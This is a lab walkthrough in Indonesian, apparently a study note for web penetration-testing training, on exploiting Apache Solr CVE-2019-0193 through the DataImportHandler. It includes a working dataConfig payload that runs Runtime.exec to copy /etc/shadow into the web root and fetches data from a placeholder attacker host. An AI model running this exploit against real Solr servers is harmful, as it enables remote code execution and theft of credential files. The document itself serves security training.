2026-02-04 20:43

Status:

Tags: [[eWPTX]] [[XML]]
###### Prasyarat: [[XML External Entities (XXE)]]
# XXE - Lab (Apache Solr)

## Ringkasan

- Target: `http://<TARGET_IP>:8983/solr`
- Product: Apache Solr (lab)
- Finding: `CVE-2019-0193` (DataImportHandler RCE path used by the lab)
- Proof: `poc.txt` accessible under `/solr/` after execution (lab)

> Ganti `<TARGET_IP>` / `<ATTACKER_IP>` sesuai nilai lab kamu.

---

## Tugas 1: Port scanning & enumerasi

### Langkah 1: Identifikasi IP target

**Perintah:**

```
ip addr
```

![[Pics/INE/131a9c628152c2aabe083c727033a0d840d627e0a6ddc047845741f4fc03e7e2_731eeaa4e8.png]]

- Hasil:

- Web app berjalan di port `8983`
- Target IP pada run saya: `192.55.34.3` (lab kamu kemungkinan berbeda)

## Tugas 2: Eksploitasi vulnerabilitas

### Langkah 2: Inspeksi web application

![[Pics/INE/0499169e16dc18764be90a6fbf9edcfed65b47e02787df275d549cbb6e30750e_24fae39bf9.png]]

### Langkah 3: Cari versi Solr / isu yang dikenal (lab)

![[Pics/INE/0b6f2ddd2acc93fb7b247e54a8ea6013b798a494a393b919830b38dbc45a9924_cbc1d4a424.png]]

Catatan:

- Link GitHub ini berisi prosedur yang dipakai lab.

Link GitHub: `https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler`

![[Pics/INE/e4203e0eb2c0c520b9ba961590ba4a4e5290be27339ea8e19099457991b35d60_eca3b42a84.png]]

### Langkah 4: Host file XML sederhana (kebutuhan lab)

```
<?xml version="1.0" encoding="utf-8"?>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```

![[Pics/INE/ecf93bd9558f655f5a33d5edc68942b2bd55d3ea636e2068da25fea855def325_59ff8dc19f.png]]

### Langkah 5: Jalankan server lokal di port 80

Perintah:

```
php -S 0.0.0.0:80
```

![[Pics/INE/e76ce5b3a991f0593ebd955f9bd6c0c3c3092f167bc09c0c2ebf63e82d262a21_fc22843d6d.png]]

### Langkah 6: Pilih core `db`

![[Pics/INE/5256b2400db4f869da7d705e00948488fe146d1283ae61fedcb360ebbeb09fd9_ce13846e5d.png]]

### Langkah 7: Buka `DataImport`

![[Pics/INE/6e0f464bb4765b432facaef0fec43ba09f24b35e73e5ce41a00f93d12b220f0a_7f22926181.png]]

### Langkah 8: Aktifkan debug mode dan paste konfigurasi lab

Konfigurasi yang dipakai di lab:

```
<dataConfig>
    <dataSource type="URLDataSource"/>
    <script><![CDATA[
        function poc(){ java.lang.<Insert payload snippet here>().exec("cp /etc/shadow /opt/solr/server/solr-webapp/webapp/poc.txt");
}
]]></script>
<document>
    <entity name="stackoverflow"
        url="http://<ATTACKER_IP>/solr"
        processor="XPathEntityProcessor"
        forEach="/note"
        transformer="script:poc" />
</document>
</dataConfig>

Note: Replace the missing payload snippet above with this Runtime.getRuntime
```

Fungsi PoC ini akan mencoba menyalin file shadow ke direktori web root.

![[Pics/INE/48c69e3bf5f67d0265d670b26771fbc3fd4db65dab287a1e42795c6f7d251353_c1a4922dff.png]]

### Langkah 9: Eksekusi konfigurasi ini

![[Pics/INE/633a0503b702aaac913cd1b82869fc0238c2b29e5dc9c02dc40d74d226949a33_2758102e2d.png]]

File XML berhasil di-index dan exploit juga berjalan.

### Langkah 10: Verifikasi output (`/solr/poc.txt`)

![[Pics/INE/f37f44fc44463398b607e469c8cac04580d22621e7ac15f4f9ac8cb79ae56f13_665e0aaee5.png]]

File shadow berhasil disalin ke direktori webroot.

---

## Referensi

1. Apache Solr (​https://lucene.apache.org/solr/​)
2. CVE-2019-0193 (​https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0193​)
3. Apache Solr DataImport Handler RCE (​https://github.com/jas502n/CVE-2019-0193​)
